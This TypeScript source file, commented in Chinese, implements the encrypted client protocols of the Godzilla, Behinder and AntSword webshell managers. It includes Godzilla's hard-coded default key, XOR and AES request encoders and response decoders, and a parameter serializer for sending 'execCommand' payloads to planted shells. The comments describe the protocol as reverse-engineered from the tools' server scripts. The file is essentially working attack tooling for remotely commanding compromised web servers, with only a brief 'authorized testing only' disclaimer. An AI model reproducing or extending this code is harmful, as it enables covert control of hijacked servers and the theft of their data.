/**
 * WebShell 加密协议实现（哥斯拉 / 冰蝎 / 蚁剑）
 * 从 E:\Tool\Network\WebShell 目录下真实工具的服务端脚本推导：
 * - 哥斯拉 test.php：XOR(key 循环) + base64 + session 会话
 * - 哥斯拉 test.jsp：AES-ECB（key 即密钥）
 * - 冰蝎 shell.php：AES-128-CBC / XOR，key=md5(密码)前16位
 * - 蚁剑 shell.php：POST shell 参数 base64 执行
 * 仅供授权测试使用。
 */
import crypto from 'node:crypto'

/** 哥斯拉 PHP 默认密钥（test.php / test.jsp 内置） */
export const GODZILLA_KEY = '3c6e0b8a9c15224a'

/** XOR 循环加密（哥斯拉 encode()：key[i+1&15] 逐字节异或，PHP 字符串语义=逐字节） */
export function xorCrypt(data: Buffer, key: string): Buffer {
  const out = Buffer.alloc(data.length)
  const kb = Buffer.from(key, 'utf8')
  for (let i = 0; i < data.length; i++) out[i] = data[i] ^ kb[(i + 1) & 15]
  return out
}

/** 哥斯拉 PHP 请求体：明文 → base64(XOR(明文))，POST 参数 pass */
export function godzillaPhpEncode(plain: Buffer, key: string): string {
  return xorCrypt(plain, key).toString('base64')
}

/** 哥斯拉 PHP 原版协议：XOR 原始字节（不 base64，shell 用 php://input 直接读取后 XOR） */
export function godzillaPhpEncodeRaw(plain: Buffer, key: string): Buffer {
  return xorCrypt(plain, key)
}

/** 哥斯拉响应解析：去掉 md5(pass+key) 前后缀 → base64 → XOR → 明文 */
export function godzillaPhpDecode(responseBody: string, pass: string, key: string): Buffer {
  const md5 = crypto.createHash('md5').update(pass + key, 'utf8').digest('hex')
  const pre = md5.slice(0, 16)
  const post = md5.slice(16)
  let body = responseBody
  if (body.startsWith(pre) && body.endsWith(post)) body = body.slice(pre.length, body.length - post.length)
  const b64 = body.trim()
  try {
    const enc = Buffer.from(b64, 'base64')
    return xorCrypt(enc, key)
  } catch { return Buffer.from(b64, 'utf8') }
}

/** 哥斯拉 JSP：AES-ECB（key 16 字节，NoPadding 补 PKCS5） */
export function godzillaJspEncode(plain: Buffer, key: string): string {
  const cipher = crypto.createCipheriv('aes-128-ecb', Buffer.from(key, 'utf8'), null)
  return Buffer.concat([cipher.update(plain), cipher.final()]).toString('base64')
}

/** 哥斯拉 JSP 原版协议：AES-ECB 原始字节（shell 用 Content-Length + getInputStream 读取） */
export function godzillaJspEncodeRaw(plain: Buffer, key: string): Buffer {
  const cipher = crypto.createCipheriv('aes-128-ecb', Buffer.from(key, 'utf8'), null)
  return Buffer.concat([cipher.update(plain), cipher.final()])
}

/** 哥斯拉 JSP 原版响应：AES-ECB 解密原始字节 → gzip 解压（无 base64、无 md5 前后缀） */
export function godzillaJspDecodeRaw(body: Buffer, key: string): Buffer {
  try {
    const decipher = crypto.createDecipheriv('aes-128-ecb', Buffer.from(key, 'utf8'), null)
    let raw = Buffer.concat([decipher.update(body), decipher.final()])
    if (raw.length > 2 && raw[0] === 0x1f && raw[1] === 0x8b) {
      try { raw = zlib.gunzipSync(raw) } catch { /* 非 gzip */ }
    }
    return raw
  } catch { return body }
}

/** 哥斯拉 JSP 响应解密：剥 md5(pass+key) 前后缀 → base64 → AES-ECB → 若 gzip 则解压 */
export function godzillaJspDecode(responseBody: string, key: string, pass?: string): Buffer {
  try {
    let body = responseBody
    if (pass) {
      const md5 = crypto.createHash('md5').update(pass + key, 'utf8').digest('hex')
      const pre = md5.slice(0, 16)
      const post = md5.slice(16)
      const lower = body.toLowerCase()
      if (lower.startsWith(pre) && lower.endsWith(post)) body = body.slice(pre.length, body.length - post.length)
    }
    const enc = Buffer.from(body.trim(), 'base64')
    const decipher = crypto.createDecipheriv('aes-128-ecb', Buffer.from(key, 'utf8'), null)
    let raw = Buffer.concat([decipher.update(enc), decipher.final()])
    // gzip magic \x1f\x8b
    if (raw.length > 2 && raw[0] === 0x1f && raw[1] === 0x8b) {
      try { raw = zlib.gunzipSync(raw) } catch { /* 非 gzip */ }
    }
    return raw
  } catch { return Buffer.from(responseBody, 'utf8') }
}

/** 哥斯拉 JSP：参数序列化 → gzip 压缩 → AES-ECB + base64（Java payload formatParameter 读 GZIPInputStream） */
export function godzillaJspEncodeParams(params: Record<string, string | Buffer>, key: string): string {
  const ser = godzillaSerializeParams(params)
  const gz = zlib.gzipSync(ser)
  return godzillaJspEncode(gz, key)
}

/** 哥斯拉 C#（ASPX）：RijndaelManaged CBC，key=connKey、IV=key（shell 用 CreateDecryptor(key,key)） */
export function godzillaCshapEncode(plain: Buffer, key: string): string {
  const cipher = crypto.createCipheriv('aes-128-cbc', Buffer.from(key, 'utf8'), Buffer.from(key, 'utf8'))
  return Buffer.concat([cipher.update(plain), cipher.final()]).toString('base64')
}

/** 哥斯拉 C# 原版协议：RijndaelManaged CBC 原始字节（shell 用 Request.BinaryRead/BinaryWrite） */
export function godzillaCshapEncodeRaw(plain: Buffer, key: string): Buffer {
  const cipher = crypto.createCipheriv('aes-128-cbc', Buffer.from(key, 'utf8'), Buffer.from(key, 'utf8'))
  return Buffer.concat([cipher.update(plain), cipher.final()])
}

/** 哥斯拉 C# 原版响应：AES-CBC(IV=key) 解密原始字节 → gzip 解压（无 base64、无 md5） */
export function godzillaCshapDecodeRaw(body: Buffer, key: string): Buffer {
  try {
    const decipher = crypto.createDecipheriv('aes-128-cbc', Buffer.from(key, 'utf8'), Buffer.from(key, 'utf8'))
    let raw = Buffer.concat([decipher.update(body), decipher.final()])
    if (raw.length > 2 && raw[0] === 0x1f && raw[1] === 0x8b) {
      try { raw = zlib.gunzipSync(raw) } catch { /* 非 gzip */ }
    }
    return raw
  } catch { return body }
}

/** 哥斯拉 C# 响应解密：剥 md5(pass+key) 前后缀 → base64 → AES-CBC(IV=key) → gzip 解压 */
export function godzillaCshapDecode(responseBody: string, key: string, pass?: string): Buffer {
  try {
    let body = responseBody
    if (pass) {
      const md5 = crypto.createHash('md5').update(pass + key, 'utf8').digest('hex')
      const pre = md5.slice(0, 16)
      const post = md5.slice(16)
      const lower = body.toLowerCase()
      if (lower.startsWith(pre) && lower.endsWith(post)) body = body.slice(pre.length, body.length - post.length)
    }
    const enc = Buffer.from(body.trim(), 'base64')
    const decipher = crypto.createDecipheriv('aes-128-cbc', Buffer.from(key, 'utf8'), Buffer.from(key, 'utf8'))
    let raw = Buffer.concat([decipher.update(enc), decipher.final()])
    if (raw.length > 2 && raw[0] === 0x1f && raw[1] === 0x8b) {
      try { raw = zlib.gunzipSync(raw) } catch { /* 非 gzip */ }
    }
    return raw
  } catch { return Buffer.from(responseBody, 'utf8') }
}

/** 冰蝎 PHP/JSP 模板：AES-128-ECB（key=md5(密码)前16位，Java Cipher.getInstance("AES")/PHP "AES128" 均为 ECB） */
export function behinderAesEncode(plain: Buffer, password: string): string {
  const md5 = crypto.createHash('md5').update(password, 'utf8').digest('hex')
  const key = Buffer.from(md5.slice(0, 16), 'utf8')
  const cipher = crypto.createCipheriv('aes-128-ecb', key, null)
  return Buffer.concat([cipher.update(plain), cipher.final()]).toString('base64')
}

export function behinderAesDecode(responseBody: string, password: string): Buffer {
  try {
    const md5 = crypto.createHash('md5').update(password, 'utf8').digest('hex')
    const key = Buffer.from(md5.slice(0, 16), 'utf8')
    const enc = Buffer.from(responseBody.trim(), 'base64')
    const decipher = crypto.createDecipheriv('aes-128-ecb', key, null)
    return Buffer.concat([decipher.update(enc), decipher.final()])
  } catch { return Buffer.from(responseBody, 'utf8') }
}

/** 冰蝎 XOR（TransProtocol php_xor：key=md5(密码)前16位） */
export function behinderXorEncode(plain: Buffer, password: string): string {
  const md5 = crypto.createHash('md5').update(password, 'utf8').digest('hex')
  const key = md5.slice(0, 16)
  return xorCrypt(plain, key).toString('base64')
}

export function behinderXorDecode(responseBody: string, password: string): Buffer {
  try {
    const md5 = crypto.createHash('md5').update(password, 'utf8').digest('hex')
    const key = md5.slice(0, 16)
    return xorCrypt(Buffer.from(responseBody.trim(), 'base64'), key)
  } catch { return Buffer.from(responseBody, 'utf8') }
}

/**
 * 哥斯拉 PHP 动态 payload 命令执行：
 * 协议（从 payload.php + PhpShell.class + test.php 逆向）：
 * 1. 握手：POST 完整 payload.php 代码（含 getBasicsInfo）→ 服务端 session 存 payload
 * 2. 执行：POST 序列化参数（0x02 + 4字节小端长度 + 值），methodName=execCommand & cmdLine=xxx
 * 3. 响应：md5(pass+key)前16 + base64(XOR(gzip?(结果))) + md5后16
 */
import zlib from 'node:zlib'

/** 哥斯拉参数序列化：key + 0x02 + 4字节小端长度 + value（与服务端 formatParameter 对应） */
export function godzillaSerializeParams(params: Record<string, string | Buffer>): Buffer {
  const out: Buffer[] = []
  for (const [k, v] of Object.entries(params)) {
    const kb = Buffer.from(k, 'utf8')
    const vb = typeof v === 'string' ? Buffer.from(v, 'utf8') : v
    const lenBuf = Buffer.alloc(4)
    lenBuf.writeUInt32LE(vb.length, 0)  // 小端序
    out.push(kb, Buffer.from([0x02]), lenBuf, vb)
  }
  return Buffer.concat(out)
}

/** 哥斯拉参数体：serialize 后 gzip（JSP/C# 动态 payload 的 formatParameter 均用 GZIPInputStream/GZipStream） */
export function godzillaSerializeGzip(params: Record<string, string | Buffer>): Buffer {
  return zlib.gzipSync(godzillaSerializeParams(params))
}

/** 哥斯拉响应解密：去 md5 前后缀 → base64 → XOR → 若 gzip 则解压 */
export function godzillaPhpDecodeFull(responseBody: string, pass: string, key: string): Buffer {
  const md5 = crypto.createHash('md5').update(pass + key, 'utf8').digest('hex')
  const pre = md5.slice(0, 16)
  const post = md5.slice(16)
  let body = responseBody
  if (body.startsWith(pre) && body.endsWith(post)) body = body.slice(pre.length, body.length - post.length)
  try {
    const enc = Buffer.from(body.trim(), 'base64')
    let raw = xorCrypt(enc, key)
    // gzip magic \x1f\x8b
    if (raw.length > 2 && raw[0] === 0x1f && raw[1] === 0x8b) {
      try { raw = zlib.gunzipSync(raw) } catch { /* 非 gzip */ }
    }
    return raw
  } catch { return Buffer.from(body, 'utf8') }
}

/** 蚁剑一句话：POST shell=base64(PHP代码) */
export function antSwordPhpEncode(phpCode: string): string {
  return Buffer.from(phpCode, 'utf8').toString('base64')
}

